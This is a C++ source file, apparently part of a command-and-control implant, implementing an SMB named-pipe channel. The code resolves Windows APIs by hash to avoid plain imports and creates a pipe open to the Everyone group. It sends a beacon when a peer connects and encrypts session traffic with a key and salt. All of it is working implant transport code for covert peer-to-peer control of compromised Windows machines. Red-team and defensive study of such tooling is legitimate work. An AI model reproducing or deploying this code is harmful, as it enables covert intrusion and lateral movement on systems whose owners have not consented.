#include "ConnectorSMB.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Crypt.h"
#include "utils.h"
#include "Agent.h"

extern Agent* g_Agent;

BOOL ConnectorSMB_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize);
void ConnectorSMB_SendData(Connector* self, BYTE* data_buf, ULONG data_size);
BYTE* ConnectorSMB_RecvData(Connector* self);
int ConnectorSMB_RecvSize(Connector* self);
void ConnectorSMB_RecvClear(Connector* self);
void ConnectorSMB_Listen(Connector* self);
BOOL ConnectorSMB_WaitForConnection(Connector* self);
BOOL ConnectorSMB_IsConnected(Connector* self);
void ConnectorSMB_DisconnectInternal(Connector* self);
void ConnectorSMB_Disconnect(Connector* self);
void ConnectorSMB_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey);
void ConnectorSMB_CloseConnector(Connector* self);

Connector* CreateConnectorSMB()
{
    Connector* conn = (Connector*)MemAllocLocal(sizeof(Connector));
    ConnectorSMBData* data = (ConnectorSMBData*)MemAllocLocal(sizeof(ConnectorSMBData));
    conn->instanceData = data;

	data->functions = (SMBFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(SMBFUNC));

	data->functions->LocalAlloc   = ApiWin->LocalAlloc;
	data->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	data->functions->LocalFree    = ApiWin->LocalFree;
	data->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	data->functions->GetLastError = ApiWin->GetLastError;
	data->functions->ReadFile     = ApiWin->ReadFile;
	data->functions->WriteFile    = ApiWin->WriteFile;

	data->functions->NtClose = ApiNt->NtClose;

	data->functions->CreateNamedPipeA    = ApiWin->CreateNamedPipeA;
	data->functions->DisconnectNamedPipe = ApiWin->DisconnectNamedPipe;
	data->functions->PeekNamedPipe       = ApiWin->PeekNamedPipe;
	data->functions->ConnectNamedPipe    = (decltype(ConnectNamedPipe)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CONNECTNAMEDPIPE);
	data->functions->FlushFileBuffers    = (decltype(FlushFileBuffers)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);

	data->functions->AllocateAndInitializeSid     = (decltype(AllocateAndInitializeSid)*)     GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_ALLOCATEANDINITIALIZESID);
	data->functions->InitializeSecurityDescriptor = (decltype(InitializeSecurityDescriptor)*) GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_INITIALIZESECURITYDESCRIPTOR);
	data->functions->FreeSid                      = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
	data->functions->SetEntriesInAclA             = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
	data->functions->SetSecurityDescriptorDacl    = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);

    conn->SetProfile = ConnectorSMB_SetProfile;
    conn->WaitForConnection = ConnectorSMB_WaitForConnection;
    conn->IsConnected = ConnectorSMB_IsConnected;
    conn->Disconnect = ConnectorSMB_Disconnect;
    conn->Exchange = ConnectorSMB_Exchange;
    conn->RecvData = ConnectorSMB_RecvData;
    conn->RecvSize = ConnectorSMB_RecvSize;
    conn->RecvClear = ConnectorSMB_RecvClear;
    conn->Sleep = Connector_DefaultSleep;
    conn->CloseConnector = ConnectorSMB_CloseConnector;

    return conn;
}

BOOL ConnectorSMB_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
	ProfileSMB profile = *(ProfileSMB*)profilePtr;

	if (beatData && beatDataSize) {
		data->beat = (BYTE*)MemAllocLocal(beatDataSize);
		if (data->beat) {
			memcpy(data->beat, beatData, beatDataSize);
			data->beatSize = beatDataSize;
		}
	}
	PSID pEveryoneSID = nullptr;
    SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;
    *(DWORD*)pIdentifierAuthority.Value = 0;
    *(WORD*)&pIdentifierAuthority.Value[4] = 256;
    if (!data->functions->AllocateAndInitializeSid(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
        return FALSE;

	PACL pACL = nullptr;
    EXPLICIT_ACCESS pListOfExplicitEntries = { 0 };
    pListOfExplicitEntries.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE; //  STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL; // 
    pListOfExplicitEntries.grfAccessMode        = SET_ACCESS;
    pListOfExplicitEntries.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    pListOfExplicitEntries.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    pListOfExplicitEntries.Trustee.ptstrName    = (LPTSTR)pEveryoneSID;

    if (data->functions->SetEntriesInAclA(1, &pListOfExplicitEntries, nullptr, &pACL) != ERROR_SUCCESS)
        return FALSE;

    PSECURITY_DESCRIPTOR pSD = data->functions->LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (!pSD || !data->functions->InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION) || !data->functions->SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE)) 
        return FALSE;

	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), pSD, FALSE };
    data->hChannel = data->functions->CreateNamedPipeA((CHAR*) profile.pipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 0x100000, 0x100000, 0, &sa);
    if (data->hChannel == INVALID_HANDLE_VALUE)
        return FALSE;

    data->functions->FreeSid(pEveryoneSID);
    data->functions->LocalFree(pACL);
    data->functions->LocalFree(pSD);

    return TRUE;
}

void ConnectorSMB_SendData(Connector* self, BYTE* data_buf, ULONG data_size)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    data->recvSize = 0;

    if (data_buf && data_size) {
        DWORD NumberOfBytesWritten = 0;
        if ( data->functions->WriteFile(data->hChannel, (LPVOID)&data_size, 4, &NumberOfBytesWritten, NULL) ) {
            
            DWORD index = 0;
            DWORD size  = 0;
            NumberOfBytesWritten = 0;
            while (1) {
                size = data_size - index;
                if (data_size - index > 0x2000)
                    size = 0x2000;

                if ( !data->functions->WriteFile(data->hChannel, data_buf + index, size, &NumberOfBytesWritten, 0) )
                    break;

                index += NumberOfBytesWritten;
                if (index >= data_size)
                    break;
            }
        }
        data->functions->FlushFileBuffers(data->hChannel);
    }

    DWORD totalBytesAvail = 0;
    BOOL result = data->functions->PeekNamedPipe(data->hChannel, 0, 0, 0, &totalBytesAvail, 0);
    if (result && totalBytesAvail >= 4) {

        DWORD NumberOfBytesRead = 0;
        DWORD dataLength = 0;
        if ( data->functions->ReadFile(data->hChannel, &dataLength, 4, &NumberOfBytesRead, 0) ) {
            
            if (dataLength > data->allocaSize) {
                data->recvData = (BYTE*) data->functions->LocalReAlloc(data->recvData, dataLength, 0);
                data->allocaSize = dataLength;
            }

            NumberOfBytesRead = 0;
            int index = 0;
            while( data->functions->ReadFile(data->hChannel, data->recvData + index, dataLength - index, &NumberOfBytesRead, 0) && NumberOfBytesRead) {
                index += NumberOfBytesRead;
        
                if (index > dataLength) {
                    data->recvSize = -1;
                    return;
                }

                if (index == dataLength)
                    break;
            }
            data->recvSize = index;
        }
    }
}

BYTE* ConnectorSMB_RecvData(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    return data->recvData;
}

int ConnectorSMB_RecvSize(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
	return data->recvSize;
}

void ConnectorSMB_RecvClear(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    if ( data->recvData && data->allocaSize )
        memset(data->recvData, 0, data->recvSize);
    data->recvSize = 0;
}

void ConnectorSMB_Listen(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    while ( !data->functions->ConnectNamedPipe(data->hChannel, nullptr) && data->functions->GetLastError() != ERROR_PIPE_CONNECTED);

    data->recvData = (BYTE*) data->functions->LocalAlloc(LPTR, 0x100000);
    data->allocaSize = 0x100000;
}

BOOL ConnectorSMB_WaitForConnection(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    ConnectorSMB_Listen(self);
    ConnectorSMB_SendData(self, data->beat, data->beatSize);
    data->connected = TRUE;
    return TRUE;
}

BOOL ConnectorSMB_IsConnected(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    return data->connected;
}

void ConnectorSMB_DisconnectInternal(Connector* self) 
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    if (data->allocaSize) {
        memset(data->recvData, 0, data->allocaSize);
        data->functions->LocalFree(data->recvData);
        data->recvData = nullptr;
    }

    data->allocaSize = 0;
    data->recvData = nullptr;

    data->functions->FlushFileBuffers(data->hChannel);
    data->functions->DisconnectNamedPipe(data->hChannel);
}

void ConnectorSMB_Disconnect(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    ConnectorSMB_DisconnectInternal(self);
    data->connected = FALSE;
}

void ConnectorSMB_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    if (plainData && plainSize > 0) {
        EncryptSessionTransport(plainData, plainSize, sessionKey, g_Agent->config->transport_salt);
        ConnectorSMB_SendData(self, plainData, plainSize);
    } else {
        ConnectorSMB_SendData(self, NULL, 0);
    }

    if (data->recvSize == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
        TEB->LastErrorValue = 0;
        data->connected = FALSE;
        return;
    }

    if (data->recvSize < 0) {
        data->connected = FALSE;
        return;
    }

    if (data->recvSize > 0 && data->recvData)
        DecryptSessionTransport(data->recvData, data->recvSize, sessionKey, g_Agent->config->transport_salt);
}

void ConnectorSMB_CloseConnector(Connector* self)
{
	ConnectorSMBData* data = (ConnectorSMBData*)self->instanceData;
    if (data->beat && data->beatSize) {
        MemFreeLocal((LPVOID*)&data->beat, data->beatSize);
        data->beat = nullptr;
        data->beatSize = 0;
    }
    data->functions->NtClose(data->hChannel);
}